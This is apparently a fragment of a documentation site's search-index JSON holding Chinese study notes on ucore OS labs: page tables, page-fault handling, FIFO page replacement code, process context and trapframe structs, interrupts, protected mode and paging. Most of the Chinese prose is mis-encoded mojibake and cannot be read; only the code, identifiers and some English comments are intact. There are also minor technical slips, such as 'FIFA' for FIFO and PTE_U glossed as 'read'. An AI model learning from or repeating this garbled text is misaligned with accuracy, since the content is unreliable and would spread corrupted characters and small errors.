å‚æ•°ï¼špgdirï¼šé¡µç›®å½•é¡¹ï¼›laï¼šé€»è¾‘åœ°å€ï¼›createï¼šæ˜¯å¦åˆ›å»ºæ–°çš„é¡µè¡¨ï¼› è¿”å›å€¼ï¼šå†…æ ¸å¯¹åº”é¡µè¡¨çš„è™šæ‹Ÿåœ°å€ã€‚  åœ¨å¯¹åº”çš„å¤´æ–‡ä»¶ pmm.h ä¸ mmu.h ä¸­ï¼Œå®šä¹‰äº†ä¸€äº›ä½ å¯èƒ½ä¼šç”¨åˆ°å®å’Œå‡½æ•°ï¼š\n PDX(la)ï¼šé€šè¿‡ä¸€ä¸ªè¿›ç¨‹çš„è™šæ‹Ÿé€»è¾‘åœ°å€ï¼Œæ±‚å¾—ä¸€ä¸ªé¡µç›®å½•é¡¹çš„ç´¢å¼•ï¼› PTX(la)ï¼šé€šè¿‡ä¸€ä¸ªè¿›ç¨‹çš„è™šæ‹Ÿé€»è¾‘åœ°å€ï¼Œæ±‚å¾—ä¸€ä¸ªé¡µè¡¨é¡¹çš„ç´¢å¼•ï¼› KADDR(pa)ï¼šé€šè¿‡ä¸€ä¸ªç‰©ç†åœ°å€ï¼Œè¿”å›ä¸€ä¸ªå¯¹åº”çš„å†…æ ¸è™šæ‹Ÿåœ°å€ï¼› set_page_ref(page, 1)ï¼šå°†é¡µçš„å¼•ç”¨è®¡æ•°åŠ ä¸€ï¼› page2pa(page)ï¼šé€šè¿‡ä¸€ä¸ªé¡µè¡¨é¡¹ï¼Œå¾—åˆ°å®ƒå®é™…çš„ç‰©ç†åœ°å€ï¼› struct Page * alloc_page()ï¼šåˆ†é…ä¸€ä¸ªå†…å­˜é¡µï¼› memset(void *s, char c, size_t n)ï¼šå°†æŒ‡é’ˆ s ä¹‹åçš„ n ä¸ªåŒºåŸŸçš„å†…å®¹è®¾ç½®ä¸º cï¼› PTE_Pï¼šå­˜åœ¨ï¼›PTE_Wï¼šå†™ï¼›PTE_Uï¼šè¯»ã€‚  é—®é¢˜ä¸€ #   è¯·æè¿°é¡µç›®å½•é¡¹ (Page Directory Entry) å’Œé¡µè¡¨ (Page Table Entry) ä¸­æ¯ä¸ªç»„æˆéƒ¨åˆ†çš„å«ä¹‰å’Œä»¥åŠå¯¹ ucore è€Œè¨€çš„æ½œåœ¨ç”¨å¤„ã€‚\n å› ä¸ºé¡µç›®å½•é¡¹ã€é¡µè¡¨ã€ç‰©ç†åœ°å€å¯¹åº”çš„èµ·å§‹åœ°å€éƒ½è¦æ±‚æŒ‰ç…§ 4096 æ¯”ç‰¹å¯¹é½ã€‚å› æ­¤ï¼š\n  é¡µç›®å½•é¡¹çš„é«˜ 20 ä½ç”¨äºå­˜å‚¨é¡µè¡¨çš„å®é™…ç‰©ç†åœ°å€ï¼›\né¡µè¡¨é¡¹çš„é«˜ 20 ä½ç”¨äºå­˜å‚¨è™šæ‹Ÿåœ°å€å¯¹åº”çš„çœŸå®ç‰©ç†åœ°å€ï¼›\n  é¡µç›®å½•é¡¹å’Œé¡µè¡¨é¡¹çš„ä½ 12 ä½éƒ½ç”¨äºå­˜å‚¨ä¸€äº›æ ‡å¿—ä½ï¼Œè¯¦ç»†çš„å†…å®¹åˆ—ä¸¾åœ¨äº† ./kern/mm/mmu.h è¿™ä¸ªæ–‡ä»¶ä¸­ã€‚\n  é—®é¢˜äºŒ #   å¦‚æœ ucore æ‰§è¡Œè¿‡ç¨‹ä¸­è®¿é—®å†…å­˜ï¼Œå‡ºç°äº†é¡µè®¿é—®å¼‚å¸¸ï¼Œè¯·é—®ç¡¬ä»¶è¦åšå“ªäº›äº‹æƒ…ï¼Ÿ\n è¿›è¡Œæ¢é¡µæ“ä½œï¼š\n é¦–å…ˆ CPU å°†äº§ç”Ÿé¡µè®¿é—®å¼‚å¸¸çš„çº¿æ€§åœ°å€æ”¾åˆ° cr2 å¯„å­˜å™¨ä¸­ ç„¶åå°±æ˜¯å’Œæ™®é€šçš„ä¸­æ–­ä¸€æ ·ä¿æŠ¤ç°åœºï¼Œå°†å¯„å­˜å™¨çš„å€¼å‹å…¥æ ˆä¸­ï¼Œç„¶åå‹å…¥ error_code ä¸­æ–­æœåŠ¡ä¾‹ç¨‹å°†å¤–å­˜çš„æ•°æ®æ¢åˆ°å†…å­˜ä¸­æ¥ æœ€åé€€å‡ºä¸­æ–­ï¼Œå›åˆ°è¿›å…¥ä¸­æ–­å‰çš„çŠ¶æ€  ä»£ç  #  "},{"id":297,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab3/exe0/","title":"Exe0","section":"lab3","content":"exe0 #  åŒ lab2ï¼š\n  å¯¼å‡º changeï¼š\n$ git diff 7ca90137c09c54f5afa9b87a35a68d9f65ecef52 HEAD labcodes/lab2/ | sed \u0026#39;s/lab2/lab3/g\u0026#39; \u0026gt; lab3/exe0.patch   è¿›è¡Œ mergeï¼š\n$ git apply lab3/exe0.patch   "},{"id":298,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab3/exe1/","title":"Exe1","section":"lab3","content":"å¦‚æœucoreçš„ç¼ºé¡µæœåŠ¡ä¾‹ç¨‹åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­è®¿é—®å†…å­˜,å‡ºç°äº†é¡µè®¿é—®å¼‚å¸¸,è¯·é—®ç¡¬ä»¶è¦åšå“ª äº›äº‹æƒ…?\nå°†äº§ç”Ÿé¡µè®¿é—®å¼‚å¸¸çš„çº¿æ€§åœ°å€å­˜å…¥ cr2 å¯„å­˜å™¨ä¸­ å¹¶ä¸”ç»™å‡º é”™è¯¯ç  error_code è¯´æ˜æ˜¯é¡µè®¿é—®å¼‚å¸¸çš„å…·ä½“åŸå› \nerror_code : the error code recorded in trapframe-\u0026gt;tf_err which is setted by x86 hardware\nå°†å…¶ å­˜å…¥ trapframe ä¸­ tf_err ç­‰åˆ°ä¸­æ–­æœåŠ¡ä¾‹ç¨‹ è°ƒç”¨é¡µè®¿é—®å¼‚å¸¸å¤„ç†å‡½æ•°do_pgfault() æ—¶ å†åˆ¤æ–­ å…·ä½“åŸå›  è‹¥ä¸åœ¨æŸä¸ªVMAçš„åœ°å€èŒƒå›´å†… æˆ– ä¸æ»¡è¶³æ­£ç¡®çš„è¯»å†™æƒé™ åˆ™æ˜¯éæ³•è®¿é—® è‹¥åœ¨æ­¤èŒƒå›´ ä¸” æƒé™ä¹Ÿæ­£ç¡® åˆ™ è®¤ä¸ºæ˜¯ åˆæ³•è®¿é—® åªæ˜¯æ²¡æœ‰å»ºç«‹è™šå®å¯¹åº”å…³ç³» åº”åˆ†é…ä¸€é¡µ å¹¶ä¿®æ”¹é¡µè¡¨ å®Œæˆ è™šæ‹Ÿåœ°å€åˆ° ç‰©ç†åœ°å€çš„æ˜ å°„ åˆ·æ–° TLB.é‡æ–°æ‰§è¡Œå¼•å‘é¡µè®¿é—®å¼‚å¸¸çš„ é‚£æ¡æŒ‡ä»¤.\n"},{"id":299,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab3/exe2/","title":"Exe2","section":"lab3","content":"exe2 #  ä»£ç  #  _fifo_map_swappable #  FIFA ç®—æ³•éœ€è¦å°†æœ€è¿‘ä½¿ç”¨è¿‡çš„é¡µé“¾æ¥åœ¨é“¾è¡¨çš„å¤´éƒ¨ã€‚\nçœ‹æ³¨é‡Šï¼Œè¿™ä¸ªå‡½æ•°æ˜¯è¦å°†åˆšåˆšä½¿ç”¨è¿‡çš„ page æ”¾åœ¨é“¾è¡¨çš„ç¬¬äºŒä¸ªå…ƒç´ ã€‚ç¨‹åºå·²ç»å°†é“¾è¡¨å’Œå…ƒç´ éƒ½é€‰å–å‡ºæ¥äº†ï¼š\nlist_entry_t *head=(list_entry_t*) mm-\u0026gt;sm_priv; list_entry_t *entry=\u0026amp;(page-\u0026gt;pra_page_link); å› æ­¤æˆ‘ä»¬åªéœ€è¦è°ƒç”¨ list_entry_t ä¸­çš„æ–¹æ³•å³å¯ï¼š\nlist_add(head, entry); _fifo_swap_out_victim #  FIFA ç®—æ³•éœ€è¦å°†æœ€é•¿æ—¶é—´æœªä½¿ç”¨è¿‡çš„é¡µä»é“¾è¡¨çš„å°¾éƒ¨å»é™¤ã€‚\nçœ‹æ³¨é‡Šæˆ‘ä»¬éœ€è¦åšçš„äº‹æƒ…æ˜¯åˆ é™¤å°¾éƒ¨ï¼Œå¹¶ä¸”ç”¨ ptr_page è¿™ä¸ªå‚æ•°æŒ‡å‘è¢«æ›¿æ¢çš„é¡µï¼š\nstatic int _fifo_swap_out_victim(struct mm_struct *mm, struct Page ** ptr_page, int in_tick) {  list_entry_t *head=(list_entry_t*) mm-\u0026gt;sm_priv;  assert(head != NULL \u0026amp;\u0026amp; in_tick==0);  list_entry_t *tail = head-\u0026gt;prev; // Select the victim  assert(tail != head); // this isn\u0026#39;t a one-element-list  *ptr_page = le2page(tail, pra_page_link); // (2) assign the value of *ptr_page to the addr of this page  list_del(tail); // (1) unlink the earliest arrival page in front of pra_list_head qeueue  assert(*ptr_page != NULL);  return 0; } do_pgfault #  æƒ¯ä¾‹å…ˆç¿»è¯‘æ³¨é‡Šï¼š\n ç»è¿‡ exe1 çš„æµç¨‹ï¼Œæˆ‘ä»¬å¯ä»¥è®¤ä¸ºå˜é‡ ptep æ˜¯ä¸€ä¸ªå¾…æ›¿æ¢çš„é¡µè¡¨é¡¹ã€‚ ç°åœ¨æˆ‘ä»¬éœ€è¦æŠŠè¿™ä¸ªé¡µè¡¨é¡¹å¯¹åº”ç£ç›˜ä¸­çš„å†…å®¹åŠ è½½åˆ°å†…å­˜ä¸­æ¥ï¼Œç„¶åå°†é€»è¾‘åœ°å€æ˜ å°„åˆ°è¿™ä¸ªé¡µè¡¨é¡¹ä¸­ï¼ŒåŒæ—¶è§¦å‘ä¹‹å‰æ›´æ”¹çš„ FIFO çš„é¡µè¡¨æ›¿æ¢é€»è¾‘ã€‚  é—®é¢˜ #   å¦‚æœè¦åœ¨ucoreä¸Šå®ç°\u0026quot;extended clocké¡µæ›¿æ¢ç®—æ³•\u0026quot;è¯·ç»™ä½ çš„è®¾è®¡æ–¹æ¡ˆï¼Œç°æœ‰çš„ swap_manageræ¡†æ¶æ˜¯å¦è¶³ä»¥æ”¯æŒåœ¨ucoreä¸­å®ç°æ­¤ç®—æ³•?å¦‚æœæ˜¯ï¼Œè¯·ç»™ä½ çš„è®¾è®¡æ–¹æ¡ˆã€‚ å¦‚æœä¸æ˜¯ï¼Œè¯·ç»™å‡ºä½ çš„æ–°çš„æ‰©å±•å’ŒåŸºæ­¤æ‰©å±•çš„è®¾è®¡æ–¹æ¡ˆã€‚å¹¶éœ€è¦å›ç­”å¦‚ä¸‹é—®é¢˜ï¼š\n  éœ€è¦è¢«æ¢å‡ºçš„é¡µçš„ç‰¹å¾æ˜¯ä»€ä¹ˆ?\n è®¿é—®æ ‡å¿—ä½å’Œä¿®æ”¹æ ‡å¿—ä½éƒ½ä¸º 0 æ—¶ï¼›\n åœ¨ ucore ä¸­å¦‚ä½•åˆ¤æ–­å…·æœ‰è¿™æ ·ç‰¹å¾çš„é¡µ?\n è®¿é—®æ ‡å¿—ä½ï¼šPTE_Aï¼›ä¿®æ”¹æ ‡å¿—ä½ï¼šPTE_Dï¼›\n ä½•æ—¶è¿›è¡Œæ¢å…¥å’Œæ¢å‡ºæ“ä½œ?\n æ¢å…¥æ˜¯åœ¨ç¼ºé¡µå¼‚å¸¸çš„æ—¶å€™ï¼Œæ¢å‡ºæ˜¯åœ¨ç‰©ç†é¡µå¸§æ»¡çš„æ—¶å€™\n"},{"id":300,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab4/exe0/","title":"Exe0","section":"lab4","content":"exe0 #  åŒ lab2ï¼š\n  å¯¼å‡º changeï¼š\n$ git diff 776bc9ece6f0f887962603c0eadf779d1443ecbd HEAD labcodes/lab3/ | sed \u0026#39;s/lab3/lab4/g\u0026#39; \u0026gt; lab4/exe0.patch   è¿›è¡Œ mergeï¼š\n$ git apply lab4/exe0.patch   "},{"id":301,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab4/exe1/","title":"Exe1","section":"lab4","content":"exe1 #  ä»£ç  #   alloc_proc å‡½æ•°ï¼ˆä½äº kern/process/proc.c ä¸­ï¼‰è´Ÿè´£åˆ†é…å¹¶è¿”å›ä¸€ä¸ªæ–°çš„ struct proc_struct ç»“æ„ï¼Œç”¨äºå­˜å‚¨æ–°å»ºç«‹çš„å†…æ ¸çº¿ç¨‹çš„ç®¡ç†ä¿¡æ¯ã€‚ucore éœ€è¦å¯¹è¿™ä¸ªç»“æ„è¿›è¡Œæœ€åŸºæœ¬çš„åˆå§‹åŒ–ï¼Œä½ éœ€è¦å®Œæˆè¿™ä¸ªåˆå§‹åŒ–è¿‡ç¨‹ã€‚\n é—®é¢˜ #   è¯·è¯´æ˜ proc_struct ä¸­ struct context context å’Œ struct trapframe *tf æˆå‘˜å˜é‡å«ä¹‰å’Œåœ¨æœ¬å®éªŒä¸­çš„ä½œç”¨æ˜¯å•¥ï¼Ÿï¼ˆæç¤ºé€šè¿‡çœ‹ä»£ç å’Œç¼–ç¨‹è°ƒè¯•å¯ä»¥åˆ¤æ–­å‡ºæ¥ï¼‰\n Contextï¼šå£°æ˜\nstruct context {  uint32_t eip;  uint32_t esp;  uint32_t ebx;  uint32_t ecx;  uint32_t edx;  uint32_t esi;  uint32_t edi;  uint32_t ebp; };  åœ¨è¿›ç¨‹åˆ‡æ¢æ—¶ï¼Œç”¨äºä¿å­˜è¿›ç¨‹è¿è¡ŒçŠ¶æ€çš„å¯„å­˜å™¨çš„å€¼çš„å˜é‡ï¼›  Trapeframeï¼šå£°æ˜ï¼š\nstruct trapframe {  struct pushregs tf_regs;  uint16_t tf_gs;  uint16_t tf_padding0;  uint16_t tf_fs;  uint16_t tf_padding1;  uint16_t tf_es;  uint16_t tf_padding2;  uint16_t tf_ds;  uint16_t tf_padding3;  uint32_t tf_trapno;  /* below here defined by x86 hardware */  uint32_t tf_err;  uintptr_t tf_eip;  uint16_t tf_cs;  uint16_t tf_padding4;  uint32_t tf_eflags;  /* below here only when crossing rings, such as from user to kernel */  uintptr_t tf_esp;  uint16_t tf_ss;  uint16_t tf_padding5; } __attribute__((packed));  å‘ç”Ÿä¸­æ–­æ—¶ï¼Œä¿å­˜ç°åœºï¼›  "},{"id":302,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E5%AE%9E%E9%AA%8C%E9%A1%B9%E7%9B%AE%E7%BB%84%E6%88%90/%E4%B8%AD%E6%96%AD%E4%B8%8E%E5%BC%82%E5%B8%B8/","title":"ä¸­æ–­ä¸å¼‚å¸¸","section":"å®éªŒé¡¹ç›®ç»„æˆ","content":"ä¸­æ–­ä¸å¼‚å¸¸ #  ç®€è¿° #  ä¸­æ–­å¼•å…¥çš„ç›®çš„ï¼š\n CPU éœ€è¦ä¸å¤–è®¾è¿›è¡Œäº¤æµã€‚ å› ä¸º CPU ä¸å¤–è®¾å­˜åœ¨æ˜¾è‘—çš„é€Ÿåº¦å·®å¼‚ï¼Œå¦‚æœä½¿ç”¨è½®è¯¢çš„æ–¹å¼åˆ™å¤ªæµªè´¹ CPU èµ„æºäº†ã€‚ å¼•å…¥ä¸­æ–­æœºåˆ¶è§£å†³äº†ä¸Šé¢ä¸¤ä¸ªé—®é¢˜ï¼Œä½†æ˜¯å¯¼è‡´æ“ä½œç³»ç»Ÿçš„ç†è§£æ›´åŠ å›°éš¾ã€‚  åœ¨æ“ä½œç³»ç»Ÿä¸­ï¼Œæœ‰ä¸‰ç§ç‰¹æ®Šçš„ä¸­æ–­äº‹ä»¶ï¼š\n ç”± CPU å¤–éƒ¨è®¾å¤‡å¼•èµ·çš„å¤–éƒ¨äº‹ä»¶ï¼Œç®€ç§°ä¸­æ–­ (interrupt)  æ¯”å¦‚ï¼šIO ä¸­æ–­ã€æ—¶é’Ÿä¸­æ–­ã€æ§åˆ¶å°ä¸­æ–­ã€‚ å› ä¸ºå®ƒçš„äº§ç”Ÿä¸ CPU çš„æ‰§è¡Œæ— å…³ï¼Œæˆ‘ä»¬ä¹Ÿç§°å®ƒä¸ºå¼‚æ­¥ä¸­æ–­ã€‚   æŠŠåœ¨ CPU æ‰§è¡ŒæŒ‡ä»¤æœŸé—´æ£€æµ‹åˆ°ä¸æ­£å¸¸æˆ–éæ³•çš„æ¡ä»¶æ‰€å¼•èµ·çš„å†…éƒ¨äº‹ä»¶ç§°ä½œå¼‚å¸¸ (exception)  æ¯”å¦‚ï¼šé™¤é›¶é”™è¯¯ã€åœ°å€è®¿é—®è¶Šç•Œã€‚ è¿™ç±» CPU å†…éƒ¨äº‹ä»¶å¯¼è‡´çš„ç§°è°“åŒæ­¥ä¸­æ–­ï¼Œä¹Ÿç§°å“ªéƒ¨ä¸­æ–­   åœ¨ç¨‹åºä¸­ä½¿ç”¨è¯·æ±‚ç³»ç»ŸæœåŠ¡è€Œå¼•å‘ï¼Œç§°ä½œé™·å…¥ä¸­æ–­ (trap interrupt)ã€ä¹Ÿç§°è½¯ä¸­æ–­ã€ç³»ç»Ÿè°ƒç”¨ã€‚  å¤„ç†ä¸­æ–­çš„çš„æµç¨‹å¤§è‡´å¦‚ä¸‹ï¼š\n CPU æ”¶åˆ°ä¸­æ–­ (8259A) æˆ–è€…å¼‚å¸¸çš„äº‹ä»¶æ—¶ï¼Œå®ƒä¼šæš‚å®šæ‰§è¡Œå½“å‰çš„ç¨‹åºæˆ–ä»»åŠ¡ï¼› CPU é€šè¿‡ IDTï¼ˆInterrupt Descriptor Tableï¼Œå­˜å‚¨ç€ä¸­æ–­å‘é‡ä¸ä¸­æ–­æœåŠ¡ä¾‹ç¨‹çš„å¯¹åº”å…³ç³»ï¼‰æŸ¥è¯¢å¤„ç†ä¸­æ–­çš„ä¾‹ç¨‹ï¼ŒIDT æ˜¯ä¸­æ–­å¤„ç†çš„æ ¸å¿ƒç»“æ„ï¼› æ‰§è¡Œä¾‹ç¨‹å®Œæˆåè·³å›è¢«æ‰“æ–­çš„ç¨‹åºã€‚  ä¸­æ–­æè¿°ç¬¦è¡¨ IDT #  IDT ä¸­çš„ä¸­æ–­æè¿°ç¬¦å¯ä»¥åˆ†ä¸ºä¸‰ç§ï¼š\n Task Gateã€Interrupt Gateã€Trap Gate  ä¸‹é¢æ˜¯è¿™ä¸‰ç§ä¸­æ–­æè¿°ç¬¦çš„ç»“æ„ï¼š\nå®éªŒä¸­ä½¿ç”¨åˆ°çš„æ˜¯åä¸¤ç§ç»“æ„ï¼Œä»–ä»¬çš„å®ç°æœ‰ç€ä¸€ç‚¹å¾®å°çš„åŒºåˆ«ï¼š\n CPU è·³è½¬åˆ° Interrupt Gate é‡Œçš„åœ°å€æ—¶ï¼Œåœ¨å°† EFLAGS ä¿å­˜åˆ°æ ˆä¸Šä¹‹åï¼Œæ¸…é™¤ EFLAGS é‡Œçš„ IF ä½ï¼Œä»¥é¿å…é‡å¤è§¦å‘ä¸­æ–­ã€‚ ç”¨æˆ·è¿›ç¨‹åœ¨æ­£å¸¸æ‰§è¡Œä¸­æ˜¯ä¸èƒ½ç¦æ­¢ä¸­æ–­çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ Trap Gate ä¸ä¼šæ¸…é™¤ IF ä½ã€‚  "},{"id":303,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E5%AE%9E%E9%AA%8C%E9%A1%B9%E7%9B%AE%E7%BB%84%E6%88%90/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E4%B8%8E%E5%88%86%E6%AE%B5%E6%A8%A1%E5%BC%8F/","title":"ä¿æŠ¤æ¨¡å¼ä¸åˆ†æ®µæ¨¡å¼","section":"å®éªŒé¡¹ç›®ç»„æˆ","content":"ä¿æŠ¤æ¨¡å¼ä¸åˆ†æ®µæ¨¡å¼ #  ç®€ä»‹ #  ä¸ºä»€ä¹ˆè¦æœ‰ä¿æŠ¤æ¨¡å¼ï¼Ÿ\n Intel 80386 åªæœ‰åœ¨ä¿æŠ¤æ¨¡å¼ä¸‹ï¼Œæ‰å¯ä»¥æä¾›æ›´å¥½çš„ä¿æŠ¤æœºåˆ¶å’Œæ›´å¤§çš„å¯»å€ç©ºé—´ï¼› æ²¡æœ‰ä¿æŠ¤æœºåˆ¶ï¼Œä»»ä½•åº”ç”¨è½¯ä»¶éƒ½å¯ä»¥ä»»æ„åœ°è®¿é—®æ‰€æœ‰è®¡ç®—æœºèµ„æºï¼› è®¸å¤šæ“ä½œç³»ç»ŸåŠŸèƒ½ï¼ˆæ¯”å¦‚åˆ†é¡µï¼‰éƒ½æ˜¯å»ºç«‹åœ¨ä¿æŠ¤æ¨¡å¼ä¸Šè®¾è®¡çš„ï¼›  å®æ¨¡å¼ #  bootloader åœ¨ BIOS ä¹‹åå¼€å§‹è¿è¡Œæ—¶ï¼ŒPC å¤„äº 16 ä½å®æ¨¡å¼è¿è¡ŒçŠ¶æ€ã€‚\nå®ƒä¸»è¦æœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š\n  å®æ¨¡å¼ä¸‹ï¼Œä¸Šå±‚è½¯ä»¶å¯ä»¥è®¿é—®çš„ç‰©ç†å†…å­˜ç©ºé—´ä¸è¶…è¿‡ 1MBï¼›\n  å®æ¨¡å¼å°†æ•´ä¸ªç‰©ç†å†…å­˜çœ‹æˆåˆ†æ®µçš„åŒºåŸŸï¼Œæ¯ä¸€ä¸ªæŒ‡é’ˆéƒ½æ˜¯æŒ‡å‘å®é™…çš„ç‰©ç†å†…å­˜ã€‚\n  é€šè¿‡ä¿®æ”¹ A20 åœ°å€çº¿å¯ä»¥å®Œæˆä»å®æ¨¡å¼åˆ°ä¿æŠ¤æ¨¡å¼çš„åˆ‡æ¢ã€‚\n  ä¿æŠ¤æ¨¡å¼ #  æ¦‚å¿µ #  GDT ä¸ LDTï¼š\n ä¿æŠ¤æ¨¡å¼ä¸‹ï¼Œæœ‰ä¸¤ä¸ªæ®µè¡¨ï¼šGDTï¼ˆGlobal Descriptor Tableï¼‰å’Œ LDTï¼ˆLocal Descriptor Tableï¼‰  æ®µæè¿°ç¬¦ï¼šGDT è¡¨çš„å†…å®¹ï¼›\n ä¸ºäº†å…¼å®¹å„ä¸ªä¸åŒç‰ˆæœ¬çš„ CPUï¼Œå®ƒçš„å½¢å¼æ¯”è¾ƒå¤æ‚ï¼› å®ƒæœ€é‡è¦çš„å­—æ®µæ˜¯ segment base ä¸ segment limitï¼› ä¹Ÿç§°ä¹‹ä¸ºæ®µï¼Œæ­¤å¤„çš„æ®µä¸ ELF æºç¨‹åºä¸­çš„ .textã€.data ç­‰æ¦‚å¿µä¸­çš„æ®µï¼Œæ˜¯ç›¸åŒçš„ã€‚  æ®µé€‰æ‹©å­ï¼š16 bitsï¼ŒGDT è¡¨çš„ç´¢å¼•ï¼›\n [0:2] æ˜¯è¡¨æ ¼çš„ä¼˜å…ˆçº§ (00 æœ€é«˜ï¼Œ11 æœ€ä½)ï¼Œ[2:3] æ˜¯è¡¨æ ¼çš„ç±»å‹ (0 ä¸º GDT)ï¼Œ[3:16] æ˜¯ GDT çš„ç´¢å¼•ï¼›  ä»‹ç» #  ä¿æŠ¤æ¨¡å¼æœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š\n 80386 çš„ 32 æ ¹åœ°å€çº¿å…¨éƒ¨æœ‰æ•ˆï¼› ä¸Šå±‚è½¯ä»¶å¯ä»¥å¯»å€é«˜è¾¾ 4G å­—èŠ‚çš„åœ°å€ç©ºé—´ï¼Œå¯è®¿é—® 64TB çš„é€»è¾‘åœ°å€ç©ºé—´ï¼› é‡‡ç”¨äº†åˆ†æ®µå­˜å‚¨ç®¡ç†æœºåˆ¶ å’Œ åˆ†é¡µå­˜å‚¨ç®¡ç†æœºåˆ¶ã€‚  åˆ†æ®µå­˜å‚¨ç®¡ç†æœºï¼Œé€»è¾‘åœ°å€ï¼ˆç”±æ®µé€‰æ‹©å­ selector ä¸æ®µåç§» offset ç»„æˆï¼‰åˆ°ç‰©ç†åœ°å€è½¬æ¢ä¼šé€šè¿‡ä»¥ä¸‹çš„ä¸¤ä¸ªæ­¥éª¤ï¼š\n  ç¬¬ä¸€æ­¥æ˜¯ä»é€»è¾‘åœ°å€å¾—åˆ°ä¸€ä¸ªçº¿æ€§åœ°å€ï¼š\nçº¿æ€§åœ°å€ = æ®µæè¿°ç¬¦è¡¨[æ®µé€‰æ‹©å­[15:3] ] + æ®µåç§»   å¦‚æœæœªå¼€å¯åˆ†é¡µåœ°å€è½¬æ¢ï¼Œåˆ™çº¿æ€§åœ°å€å³ä¸ºç‰©ç†åœ°å€ï¼›å¦åˆ™éœ€è¦ç”±æ“ä½œç³»ç»Ÿè¿›ä¸€æ­¥å¤„ç†ã€‚\n  "},{"id":304,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E5%AE%9E%E9%AA%8C%E9%A1%B9%E7%9B%AE%E7%BB%84%E6%88%90/%E5%88%86%E9%A1%B5%E6%8A%80%E6%9C%AF/","title":"åˆ†é¡µæŠ€æœ¯","section":"å®éªŒé¡¹ç›®ç»„æˆ","content":" å‚è€ƒï¼š\n https://stackoverflow.com/questions/29945171/difference-between-page-table-and-page-directory   åˆ†é¡µæŠ€æœ¯ #  è®¾è®¡ #  ä¸‹é¢ä¸€å¼ å›¾å¯ä»¥å±•ç¤ºåˆ†é¡µæŠ€æœ¯çš„å±‚çº§è®¾è®¡è¿‡ç¨‹ï¼š\næ¦‚å¿µ #  é¡µ (Page)ï¼š\n åœ¨è¿›ç¨‹çš„é€»è¾‘åœ°å€ä¸­ï¼Œä¸€æ®µè¿ç»­åœ°å€çš„é›†åˆã€‚ é¡µçš„å¤§å°ä¸€èˆ¬æä¾›ä¸‰ç§è§„æ ¼ï¼š4Kã€2Mã€4M  Frameï¼š\n åœ¨å†…å­˜çš„ç‰©ç†åœ°å€ä¸­ï¼Œä¸€æ®µè¿ç»­åœ°å€çš„é›†åˆã€‚ ä¸€ä¸ª Page ä¸ä¸€ä¸ªå¯¹åº”çš„ Frame å¯¹åº”ï¼ŒFrame çš„å¤§å°ä¸ Page ä¹Ÿæ˜¯ç›¸åŒçš„ã€‚  é¡µè¡¨ (Page Table) ä¸é¡µç›®å½• (Page Directory)ï¼š\n  é¡µè¡¨ï¼šæ˜¯ä¸€ä¸ªæœ‰ 1024 ä¸ª 32-bit å…ƒç´ çš„åˆ—è¡¨ï¼Œæ¯ä¸€ä¸ªå…ƒç´ éƒ½æŒ‡å‘ä¸€ä¸ªçœŸå®çš„ç‰©ç†åœ°å€ï¼›\nå¦‚æœé¡µè¡¨å¤§å°ä¸º 4Kï¼Œæˆ‘ä»¬åªèƒ½è¡¨ç¤º 1024 * 4K = 2^22ï¼Œ22-bit çš„é€»è¾‘åœ°å€ã€‚è€Œæˆ‘ä»¬éœ€è¦ 4G = 32-bit çš„é€»è¾‘åœ°å€ã€‚å› æ­¤å¦‚æœåªæœ‰ä¸€ä¸ªé¡µè¡¨ï¼Œæˆ‘ä»¬æ— æ³•è¡¨ç¤ºæ•´ä¸ªé€»è¾‘åœ°å€ç©ºé—´ã€‚\n  é¡µç›®å½•ï¼šå› ä¸ºé¡µè¡¨æ— æ³•æ˜ å°„æ‰€æœ‰é€»è¾‘åœ°å€è€Œäº§ç”Ÿçš„äºŒçº§ç›®å½•ï¼Œå®ƒä¹Ÿæ˜¯ä¸€ä¸ªæœ‰ 1024 ä¸ª 32-bit å…ƒç´ çš„åˆ—è¡¨ï¼Œæ¯ä¸€ä¸ªå…ƒç´ éƒ½æŒ‡å‘ä¸€ä¸ªé¡µè¡¨çš„åœ°å€ï¼›\né¡µè¡¨å’Œé¡µç›®å½•é¡¹ä¸€èµ·å·¥ä½œï¼Œæˆ‘ä»¬å³å¯ä»¥æ˜ å°„æ•´ä¸ª 4G = 32-bit çš„é€»è¾‘åœ°å€ã€‚\n  æµç¨‹ #  "},{"id":305,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/","title":"æœŸæœ«å¤ä¹ ","section":"æ“ä½œç³»ç»Ÿ","content":"æœŸæœ«å¤ä¹  #  æ¦‚å¿µ #  å¿«è¡¨ï¼ŒTLBï¼ˆTranslation Look-aside Bufferï¼‰ï¼š\nåç½®é¡µè¡¨\nç¼ºé¡µä¸­æ–­ #  